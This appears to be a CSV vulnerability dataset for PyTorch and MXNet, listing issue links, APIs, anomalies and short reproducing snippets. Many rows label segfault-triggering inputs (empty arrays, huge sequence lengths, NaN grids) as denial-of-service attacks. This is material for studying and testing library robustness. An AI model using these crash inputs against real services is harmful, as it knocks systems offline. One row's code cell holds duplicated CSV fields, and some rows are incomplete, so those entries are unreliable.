Library,Advisory Link,Commit,Parent Module,API,Anomaly,Reproducing Example,Vulnerable Parameter,Root cause 1,Root cause 2,Attack type
Pytorch,https://github.com/pytorch/pytorch/issues/47610,N.A,torch,torch.gather,Dimension mismatch,"import torch
torch.manual_seed(0)
input = torch.rand(4, 2)
index = torch.randint(2, size=(4,)).unsqueeze(0)  # intended to be unsqueeze(1)
dim = 1
output = torch.gather(input, dim, index)
print(""input = "", input)
print(""index = "", index)
print(""output = "", output)","index
input",N.A,N.A,N.A
Pytorch,https://github.com/pytorch/pytorch/issues/46225,N.A,torch,torch.mode,NaN input,"def test(device):
    x = torch.rand(1000).mul(5).long().to(device)
    s = torch.bincount(x, minlength=5).argsort(descending=True)
    
    mode =  x.mode().values
    print(f'w/o nans, got {mode}, expected {s[0]}')

    y = x.clone().float()
    y[y == mode] = np.nan
    mode =  y.mode().values.long()
    print(f'w nans, got {mode}, expected {s[1]}')",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/43567,N.A,torch,torch.svd,NaN input,"torch.svd(torch.tensor([[float('nan'), 1.0]]).cuda())",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/43115,N.A,torch,torch.multinomial,Very large input argument,"import torch
for ncat in (2**8, 2**22, 2**24):
    probs=torch.empty(ncat) 
    half = ncat//2    
    probs[half:]=1
    probs[:half-1]=2
    out=torch.multinomial(probs, num_samples=10**5, replacement=True) 
    print(""number of categories {:10}, number of samples in upper half {:8} "".format(ncat, (out>=half).sum().item())) #would expect 1/3 (~33333) of generated values to be >=half, true for ncat 2**8, 2**22, 0 for ncat 2**24",num_samples,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/37556,N.A,torch,torch.cartesian_prod,Rank other than 1,"a = [[1,1], [2,3], [3,5]]
b = [[4, 5], [3,6]]
print(list(itertools.product(a, b)))
tensor_a = torch.tensor(a)
tensor_b = torch.tensor(b)
#torch.cartesian_prod(tensor_a, tensor_b)
torch.cartesian_prod(tensor_a, tensor_b)",tensors,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/29372,N.A,torch,torch.std,Scalar tensor,"import numpy as np
np.std(4) # returns 0
import torch
torch.std(torch.tensor(4.)) # returns NaN",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/25648,N.A,torch,torch.cat,Negative argument,"import torch 
from torch import nn

device = torch.device('cuda') # crashes with cuda, works with cpu

class Model(nn.Module):

    def __init__(self):
        super().__init__()
        self.linear1 = nn.Linear(2, 16)
        self.linear2 = nn.Linear(2, 16)

    def forward(self, x, y):
        x = self.linear1(x)
        y = self.linear2(y)
        return torch.cat([x, y], dim=-1) # if we replace -1 with 1 works fine with either GPU or CPU

model = Model().to(device)

data = [torch.randn(1, 2).to(device), torch.randn(1, 2).to(device)] 

traced = torch.jit.trace(model, data)

print(traced)",dim,N.A,N.A,crash
Pytorch,https://github.com/pytorch/pytorch/issues/24823,N.A,torch.nn.functional,torch.nn.functional.grid_sample,Invalid argument,"import torch

image = torch.rand(1, 1, 3, 3, device='cpu')
grid = torch.rand(1, 3, 3, 2, device='cpu')
grid[:,1,1,0] = float('nan')
torch.nn.functional.grid_sample(image, grid, padding_mode='reflection')",padding_mode,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/24823,N.A,torch.nn.functional,torch.nn.functional.grid_sample,Invalid argument,"import torch

image = torch.rand(1, 1, 3, 3, device='cpu')
grid = torch.rand(1, 3, 3, 2, device='cpu')
grid[:,1,1,0] = float('nan')
torch.nn.functional.grid_sample(image, grid, padding_mode='border')",padding_mode,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/23159,N.A,torch,torch.sum,dim >= 64,"import torch
sizes = [1]*65
x = torch.randn(sizes)
x.sum(0)
x.sum(65)",dim,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/23061,N.A,torch,torch.einsum,Float16 dtype,"import os
os.environ['CUDA_VISIBLE_DEVICES']='0'
import torch
from time import time

a = torch.empty(24,32,40,48, dtype=torch.float32).to('cuda')
b = torch.empty(64,32,40,48, dtype=torch.float32).to('cuda')
c = torch.empty(40,80,24, dtype=torch.float32).to('cuda')
d = torch.empty(40,24,16, dtype=torch.float32).to('cuda')

st = time()
for _ in range(1000):
    c.matmul(d)
print(time()-st)

st = time()
for _ in range(1000):
    torch.einsum('ibnd,jbnd->ijbn', a, b)
print(time()-st)",operands,N.A,N.A,Slow
Pytorch,https://github.com/pytorch/pytorch/issues/22788,N.A,torch,torch.matmul,Float16 dtype,"import os
os.environ['CUDA_VISIBLE_DEVICES']='0'
import torch
from time import time


a = torch.empty(24,32,40,48, dtype=torch.float16).to('cuda')
b = torch.empty(64,32,40,48, dtype=torch.float16).to('cuda')
c = torch.empty(40,80,24, dtype=torch.float16).to('cuda')
d = torch.empty(40,24,16, dtype=torch.float16).to('cuda')

st = time()
for _ in range(1000):
    torch.matmul(c,d)
print(time()-st)

st = time()
for _ in range(1000):
    torch.einsum('ibnd,jbnd->ijbn', a, b)
print(time()-st)",operands,,,Slow
Pytorch,https://github.com/pytorch/pytorch/issues/22105,N.A,torch,torch.zeros,Pandas indice,"import numpy as np
import torch
import pandas as pd


idx = pd.core.indexes.numeric.Int64Index(np.arange(10000))
arr = torch.zeros(len(idx))

while True:
    arr[idx]",size,N.A,N.A,memory leak
Pytorch,https://github.com/pytorch/pytorch/issues/17897,N.A,torch,torch.mv,Very large input argument,"x = torch.ones(35783, 65133, device='cuda')
y = torch.randn(65133, device='cuda')
z = torch.mv(x, y)
torch.cuda.synchronize()  # report asynchronous error","input
vec",N.A,N.A,illegal memory access
Pytorch,https://github.com/pytorch/pytorch/issues/17350,N.A,torch.nn,torch.nn.CrossEntropyLoss,mean input,"import numpy as np
import torch

outputs = np.random.rand(16, 1, 256, 256)
outputs = np.hstack((outputs, 1.0 - outputs))
targets = np.random.randint(2, size=(16, 256, 256))

seed = 0
torch.backends.cudnn.deterministic = True
torch.backends.cudnn.benchmark = False

for reduction in ['none', 'sum', 'mean']:
    print(reduction)

    for i in range(10):
        torch.manual_seed(seed)
        np.random.seed(seed)

        outputs_t, targets_t = torch.from_numpy(outputs), torch.from_numpy(targets)
        outputs_t, targets_t = outputs_t.cuda(0), targets_t.cuda(0)

        loss_fn = torch.nn.CrossEntropyLoss(reduction=reduction)
        loss_fn = loss_fn.cuda(0)

        loss = loss_fn(outputs_t, targets_t)
        loss = loss.detach().cpu().numpy()
        print(i, outputs.sum(), targets.sum(), outputs.mean(), targets.mean(), loss.sum(), loss.mean())",reduction,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/15728,N.A,torch.nn,torch.nn.CrossEntropyLoss,sum input,"""import numpy as np
import torch

outputs = np.random.rand(16, 1, 256, 256)
outputs = np.hstack((outputs, 1.0 - outputs))
targets = np.random.randint(2, size=(16, 256, 256))

seed = 0
torch.backends.cudnn.deterministic = True
torch.backends.cudnn.benchmark = False

for reduction in ['none', 'sum', 'mean']:
    print(reduction)

    for i in range(10):
        torch.manual_seed(seed)
        np.random.seed(seed)

        outputs_t, targets_t = torch.from_numpy(outputs), torch.from_numpy(targets)
        outputs_t, targets_t = outputs_t.cuda(0), targets_t.cuda(0)

        loss_fn = torch.nn.CrossEntropyLoss(reduction=reduction)
        loss_fn = loss_fn.cuda(0)

        loss = loss_fn(outputs_t, targets_t)
        loss = loss.detach().cpu().numpy()
        print(i, outputs.sum(), targets.sum(), outputs.mean(), targets.mean(), loss.sum(), loss.mean())""        reduction        N.A        segfault        Denial of service",reduction,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/7343,N.A,torch.autograd,torch.autograd.grad,Invalid argument,"torch.manual_seed(2332)
dim = 10
winit = torch.randn([dim])
w1 = torch.randn([dim+1],requires_grad=True)
w2 = w1[dim:]
torch.autograd.set_detect_anomaly(True)

for e in range(1000):
    param0 = winit.clone().detach().requires_grad_()

    p = torch.sum((param0-w2)*(param0-w2))
    param0grad = torch.autograd.grad(p,param0,create_graph=True)[0] #mem leak
    param1 = param0 - 0.1*param0grad

    del param1
    del param0grad
    del p
    del param0
    gc.collect()

    if (e%100==0): 
        p = psutil.Process()
        mem_info = p.memory_info()
        print('epoch ',e,' mem info ',mem_info)",create_graph,N.A,N.A,memory leak
Pytorch,https://github.com/pytorch/pytorch/issues/7343,N.A,torch.autograd,torch.autograd.grad,Invalid argument,"x = torch.randn(1, device='cuda', requires_grad=True)
y = x.tanh()
y.backward(torch.ones_like(y), create_graph=True)",create_graph,N.A,N.A,memory leak
MXNet,https://github.com/apache/incubator-mxnet/issues/20959,N.A,gluon.data,gluon.data.DataLoader,num_workers > 0,"import mxnet.gluon as gl
import mxnet as mx
import gc

if __name__ == ""__main__"":
    gpu_ctx = mx.gpu()
    model = gl.nn.Embedding(10, 5)
    model.initialize(ctx=gpu_ctx)
    X = mx.random.uniform(shape=(1000, 3))
    dataset = mx.gluon.data.dataset.ArrayDataset(X)
    num_workers_list = [0, 4, 8]
    for num_workers in num_workers_list:

        for epoch in range(5):
            dataset = mx.gluon.data.dataset.ArrayDataset(X)
            data_loader = gl.data.DataLoader(
                dataset,
                batch_size=1,
                num_workers=num_workers,
            )
            for batch in data_loader:
                # move data to gpu
                data_gpu = batch.copyto(mx.gpu())
                # forward
                l = model(data_gpu)
                # force immediate compute
                l.asnumpy()
            # gc & gpu_ctx.empty_cache
            mx.nd.waitall()
            del dataset
            del data_loader
            gc.collect()
            gpu_ctx.empty_cache()
            mx.nd.waitall()

            a, b = mx.context.gpu_memory_info(0)
            print(f""num_workers: {num_workers} epoch {epoch}: ""
                  f""current gpu memory {(b - a) / (1024 * 1024 * 1024)} GB, ""
                  f""Total gpu memory {b / (1024 * 1024 * 1024)} GB."")",num_workers,N.A,N.A,memory leak
MXNet,https://github.com/apache/incubator-mxnet/issues/20183,N.A,mxnet.ndarray,mxnet.ndarray.signsgd_update,Empty input,"import numpy as np
import mxnet
weight=mxnet.nd.ones((1,))
grad=mxnet.nd.array(np.ones((0,)))
mxnet.ndarray.signsgd_update(weight=weight, grad=grad, lr=0.9)",grad,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/20182,N.A,mxnet.contrib.ndarray,mxnet.contrib.ndarray.quadratic,Empty input,"import numpy as np
import mxnet

mxnet.contrib.ndarray.quadratic(data=mxnet.nd.array(np.ones((0,))), b=1, out=mxnet.nd.ones((1)))",data,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/20181,N.A,mxnet.ndarray,mxnet.ndarray.pick,Empty input,"import numpy as np
import mxnet

mxnet.ndarray.pick(data=mxnet.nd.ones((1,1)),index=mxnet.nd.array(np.ones((0,))))",index,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/20180,N.A,mxnet.ndarray,mxnet.ndarray.contrib.box_encode,Empty input,"import mxnet
import numpy as np
samples=mxnet.nd.ones((1,1))
matches=mxnet.nd.ones((1,1))
anchors=mxnet.nd.ones((1,1,4))
refs=mxnet.nd.array(np.ones((1,0,4)))
means=mxnet.nd.ones((4,))
stds=mxnet.nd.ones((4,))
mxnet.ndarray.contrib.box_encode(samples=samples, matches=matches, anchors=anchors, refs=refs, means=means, stds=stds)",refs,,,
MXNet,https://github.com/apache/incubator-mxnet/issues/20079,N.A,mxnet.ndarray,mxnet.ndarray.histogram,Very large input argument,"import mxnet
mxnet.ndarray.histogram(a=mxnet.nd.ones((1, 1, 1, 1)), range=(-2e+307, 1e+307))",range,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/20076,N.A,mxnet.ndarray,mxnet.ndarray.op.SequenceMask,Invalid argument,"import mxnet
mxnet.ndarray.op.SequenceMask(data=mxnet.nd.ones((1,1)), sequence_length = mxnet.nd.array([1e+18]), use_sequence_length=True)",N.A,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/20076,N.A,mxnet.ndarray,mxnet.ndarray.op.SequenceReverse,Invalid argument,"mxnet.ndarray.op.SequenceReverse(data=mxnet.nd.ones((1,1)), sequence_length = mxnet.nd.array([1e+09]), use_sequence_length=True)",N.A,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/20076,N.A,mxnet.ndarray,mxnet.ndarray.SequenceLast,Invalid argument,"mxnet.ndarray.SequenceLast(data=mxnet.nd.ones((1,1)), sequence_length = mxnet.nd.array([1e+09]), use_sequence_length=True)",N.A,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/19941,N.A,mxnet.ndarray,mxnet.ndarray.take,Empty input,"import mxnet
import numpy as np
mxnet.ndarray.take(indices = mxnet.nd.array((3, 8, 19, 2)), a=mxnet.nd.array(np.ones((0))))",a,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/16051,N.A,mxnet.nd,mx.nd.softmax,float32 argument,"import mxnet as mx

len = mx.nd.array([1,2]); 
x = mx.nd.array([[1,2],[3,4]]); 
mx.nd.softmax(data=x, length=len, use_length=True)",len,N.A,segfault,Denial of service
MXNet,https://github.com/apache/incubator-mxnet/issues/13193,N.A,mxnet.nd,nd.sparse.elemwise_mul,Sparse tensor,"b = nd.array([[0, 1, 2, 3, 4, 0, 0]]).tostype('csr')
a = nd.array([[1, 2, 3, 0, 0, 0, 0]]).tostype('csr')
d = nd.sparse.elemwise_mul(a, b)",N.A,N.A,N.A,wrong result
